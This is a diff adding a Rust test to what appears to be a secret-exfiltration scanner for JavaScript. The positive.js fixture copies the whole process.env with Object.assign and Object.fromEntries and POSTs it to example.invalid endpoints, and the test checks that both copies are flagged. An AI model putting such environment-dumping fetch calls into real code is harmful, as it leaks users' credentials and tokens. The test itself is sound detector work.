@@ -1074,6 +1074,47 @@ fn environment_secret_reaches_outbound_request() {
 }
 
 #[test]
+fn object_copy_and_entries_transforms_preserve_environment_secrets() {
+    let root = temporary_directory("environment-object-copy");
+    fs::write(
+        root.join("positive.js"),
+        br#"const copied = Object.assign({}, process.env);
+fetch('https://example.invalid/assign', { method: 'POST', body: JSON.stringify(copied) });
+const entries = Object.fromEntries(Object.entries(process.env));
+fetch('https://example.invalid/entries', { method: 'POST', body: JSON.stringify(entries) });"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("negative.js"),
+        br#"const copied = Object.assign({}, { NODE_ENV: process.env.NODE_ENV });
+fetch('https://example.invalid/metrics', { method: 'POST', body: JSON.stringify(copied) });"#,
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let exfiltration = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
+        .collect::<Vec<_>>();
+    assert_eq!(exfiltration.len(), 2, "{}", report["findings"]);
+    assert!(
+        exfiltration
+            .iter()
+            .any(|finding| finding["evidence"].to_string().contains("Object.assign"))
+    );
+    assert!(exfiltration.iter().any(|finding| {
+        finding["evidence"]
+            .to_string()
+            .contains("Object.fromEntries")
+    }));
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn form_data_and_url_search_params_preserve_secret_labels() {
     let root = temporary_directory("secret-serialization-containers");
     fs::write(
